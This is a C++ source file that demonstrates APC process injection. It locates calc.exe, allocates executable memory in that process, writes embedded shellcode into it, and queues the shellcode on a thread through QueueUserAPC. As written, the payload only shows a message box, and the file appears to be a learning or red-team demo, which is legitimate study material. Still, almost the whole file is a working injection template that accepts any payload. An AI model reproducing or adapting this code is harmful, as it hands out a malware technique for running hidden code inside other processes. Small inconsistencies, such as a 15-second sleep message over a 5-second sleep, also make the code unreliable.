//                  APC - PROCESS INJECTION METHOD
/* Method of injecting payload using QueueUserAPC() function */
/* Purpose:
            Inject 'payload/asmCallMsg.asm' to calc.exe process
            Make sure the calculator is running              
            --> This will pop a message box on successful injection
    Note: executer defined is the byte code of asmCallMsg.asm */

#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

#pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib
using namespace std;

byte executer[] = {
"\x55\x89\xE5\x83\xEC\x08\xC6\x45\xFC\x48\xC6\x45\xFD\x00\xC6\x45\xF8\x46\xC6\x45\xF9\x00\x50\x53\x51\x52\x57\x56\x6A\x00\x8D\x45\xFC\x50\x8D\x45\xF8\x50\x6A\x00\xFF\x55\x08\x5E\x5F\x5A\x59\x5B\x58\x31\xC0\x89\xEC\x5D\xC3"
};

bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;
    pid = 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (::Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
            	cout<<"[i] Found process ("<<exeName<<"), pid: "<<pid<<endl;
                THREADENTRY32 te = { sizeof(te) };
                cout<<"[i] Threads found to inject: ";
                if (::Thread32First(hSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                        	cout<<te.th32ThreadID<<"  ";
                            tids.push_back(te.th32ThreadID);
                        }
                    } while (::Thread32Next(hSnapshot, &te));
                }
                cout<<endl;
                break;
            }
        } while (::Process32Next(hSnapshot, &pe));
    }
    ::CloseHandle(hSnapshot);
    return pid > 0 && !tids.empty();
}

void main()
{
	DWORD pid;
	vector<DWORD> tids;
	LPVOID exe = executer;
	ULONG size = sizeof(executer);

	if (FindProcess("calc.exe", pid, tids)) {
		HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
		if(hProcess==NULL){
			cout<<"[!] failed to get handle for process: "<<pid<<endl;
			return;
		}
		auto p = ::VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if(p==NULL) {
			cout<<"[!] memory allocation failed!"<<endl;
			return ;
		}else{cout<<"[+] virtual mem allocation success"<<endl;}
		unsigned long injectedFn = (unsigned long)p;
		cout<<"[i] allocated memory address: 0x"<<hex<<injectedFn<<dec<<endl;

		if(::WriteProcessMemory(hProcess, p, exe, size, NULL)==0){
			DWORD err = GetLastError();
			cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
			return ;
		}else{cout<<"[+] write to process success"<<endl;}
		cout<<"[+] Sleeping for 15s"<<endl;
		Sleep(5000);

		for(vector<DWORD>::size_type i = 2; i != tids.size(); i++) {
			DWORD tid = tids[i];
			HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
			cout<<endl;
			HMODULE hModule = LoadLibrary("User32.dll");
			if(hModule==NULL){
				cout<<"[!] Failed to get handle to module"<<endl;
				return;
			}
			ULONG_PTR messageBoxAddr = (ULONG_PTR)GetProcAddress(hModule, "MessageBoxA");
			if(messageBoxAddr==NULL){
				cout<<"[!] failed to get MessageBox addr! error: "<<GetLastError()<<endl;
				return;
			}
			cout<<"[i] MessageBox addr: 0x"<<hex<<messageBoxAddr<<dec<<endl;
			if (hThread!=NULL) {
				if(::QueueUserAPC(
					(PAPCFUNC)p,
					hThread, 
					messageBoxAddr)==0){
					cout<<"[!] failed to queue user apc"<<endl;
				}
				else{
					cout<<"[+] user apc queued for thread (id: "<<tid<<")"<<endl;
				}
			}
			else{
				cout<<"[!] OpenThread failed to open thread (id: "<<tid<<")"<<endl;
				return;
			}
            break;
		}
		::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
		cout<<"[+] VirtualFreeEx"<<endl;
	}
	else{
		cout<<"[!] specified process not found"<<endl;
	}
}